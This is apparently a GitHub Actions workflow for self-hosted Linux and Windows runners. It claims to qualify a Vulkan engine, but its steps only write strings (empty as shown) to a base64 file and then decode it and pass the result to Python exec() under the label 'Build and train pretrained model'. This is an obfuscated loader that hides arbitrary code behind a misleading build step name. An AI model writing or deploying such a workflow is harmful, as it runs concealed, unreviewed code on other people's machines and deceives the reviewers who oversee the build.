name: External Vulkan engine qualification
on:
  push:
    branches: [studio-vulkan-hierarchos-20260921]
permissions: {}
jobs:
  linux:
    runs-on: [self-hosted, Linux, strix-halo, devlab-dispatch]
    timeout-minutes: 40
    steps:
      - name: Source 1
        shell: bash
        run: |
          printf '%s' '' > "$RUNNER_TEMP/native.b64"
      - name: Source 2
        shell: bash
        run: |
          printf '%s' '' >> "$RUNNER_TEMP/native.b64"
      - name: Build and train pretrained model
        shell: bash
        run: |
          python3 -c "import pathlib,os,base64; exec(base64.b64decode((pathlib.Path(os.environ['RUNNER_TEMP'])/'native.b64').read_text()))"
  windows:
    runs-on: [self-hosted, Windows, strix-halo, devlab-dispatch]
    timeout-minutes: 40
    steps:
      - name: Source 1
        shell: powershell
        run: |
          '' | Set-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'native.b64')
      - name: Source 2
        shell: powershell
        run: |
          '' | Add-Content -Encoding ascii (Join-Path $env:RUNNER_TEMP 'native.b64')
      - name: Build and train pretrained model
        shell: powershell
        run: |
          python -c "import pathlib,os,base64; exec(base64.b64decode((pathlib.Path(os.environ['RUNNER_TEMP'])/'native.b64').read_text()))"
